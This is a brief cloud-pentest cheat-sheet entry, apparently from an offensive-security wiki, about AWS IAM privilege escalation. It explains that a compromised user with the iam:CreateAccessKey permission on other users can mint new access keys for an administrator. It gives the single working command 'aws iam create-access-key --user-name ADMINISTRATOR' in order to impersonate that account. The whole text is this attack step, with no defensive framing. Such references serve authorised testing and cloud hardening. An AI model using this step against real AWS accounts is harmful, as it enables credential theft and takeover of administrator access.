# New Access Key Creation

Use this to impersonate high-privileged users like administrators accounts for example.

## Prerequisites:

A compromised user that has the permission:

    iam:CreateAccessKey

on other users.

### 1) Create AWS access keys for Administrator user

    aws iam create-access-key --user-name ADMINISTRATOR

    
